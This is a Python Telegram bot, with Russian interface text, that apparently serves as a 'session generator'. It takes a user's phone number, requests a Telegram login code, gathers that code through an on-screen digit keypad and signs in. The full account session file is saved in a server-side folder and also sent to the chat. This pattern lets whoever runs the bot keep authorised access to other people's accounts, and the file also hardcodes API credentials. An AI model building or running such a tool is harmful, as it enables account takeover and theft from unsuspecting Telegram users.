import os
import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import threading

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)
os.makedirs('sessions', exist_ok=True)

user_clients = {}
user_phones = {}
user_codes = {}

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop)

# Клавиатура для ввода кода
def code_keyboard(uid):
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = []
    for i in range(1, 10):
        buttons.append(types.InlineKeyboardButton(str(i), callback_data=f"code_{uid}_{i}"))
    buttons.append(types.InlineKeyboardButton("0", callback_data=f"code_{uid}_0"))
    buttons.append(types.InlineKeyboardButton("⌫", callback_data=f"code_{uid}_del"))
    buttons.append(types.InlineKeyboardButton("✅ Отправить", callback_data=f"code_{uid}_send"))
    
    for i in range(0, 9, 3):
        markup.row(*buttons[i:i+3])
    markup.row(buttons[9], buttons[10], buttons[11])
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    bot.send_message(uid, "🔑 Нажми кнопку, чтобы отправить номер", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if not m.contact:
        bot.send_message(uid, "❌ Ошибка, попробуй /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    user_phones[uid] = phone
    user_codes[uid] = ""
    
    async def send_code():
        client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
        user_clients[uid] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            bot.send_message(uid, "✅ Код отправлен! Введите код кнопками ниже:", reply_markup=code_keyboard(uid))
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_clients[uid]
    
    run_async(send_code())

@bot.callback_query_handler(func=lambda call: call.data.startswith('code_'))
def handle_code_input(call):
    uid = call.from_user.id
    data = call.data.split('_')
    
    if len(data) < 3:
        return
    
    action = data[2]
    
    if action == 'del':
        user_codes[uid] = user_codes[uid][:-1]
    elif action == 'send':
        code = user_codes[uid]
        if len(code) != 5:
            bot.answer_callback_query(call.id, "❌ Код должен быть из 5 цифр")
            return
        
        client = user_clients.get(uid)
        phone = user_phones.get(uid)
        
        if not client or not phone:
            bot.answer_callback_query(call.id, "❌ Ошибка, начни заново /start")
            return
        
        async def login():
            try:
                await client.sign_in(phone, code)
                await client.disconnect()
                
                session_file = f'sessions/user_{uid}.session'
                if os.path.exists(session_file):
                    with open(session_file, 'rb') as f:
                        bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
                else:
                    bot.send_message(uid, "❌ Файл сессии не найден")
                
                del user_clients[uid]
                del user_phones[uid]
                del user_codes[uid]
                
            except Exception as e:
                bot.send_message(uid, f"❌ Ошибка: {e}")
                await client.disconnect()
                del user_clients[uid]
                del user_phones[uid]
                del user_codes[uid]
        
        run_async(login())
        bot.answer_callback_query(call.id)
        return
    else:
        user_codes[uid] += action
    
    # Показываем текущий ввод
    try:
        bot.edit_message_text(
            f"📱 Введите код:\n`{user_codes[uid]}`\n\n(кнопками ниже)", 
            call.message.chat.id, 
            call.message.message_id, 
            parse_mode="Markdown",
            reply_markup=code_keyboard(uid)
        )
    except:
        pass
    
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['cancel'])
def cancel(m):
    uid = m.chat.id
    if uid in user_clients:
        async def close():
            await user_clients[uid].disconnect()
        run_async(close())
        del user_clients[uid]
        del user_phones[uid]
        del user_codes[uid]
    
    markup = types.ReplyKeyboardRemove()
    bot.send_message(uid, "❌ Отменено", reply_markup=markup)

def start_loop():
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

print("🚀 Session Bot запущен")
bot.infinity_polling()
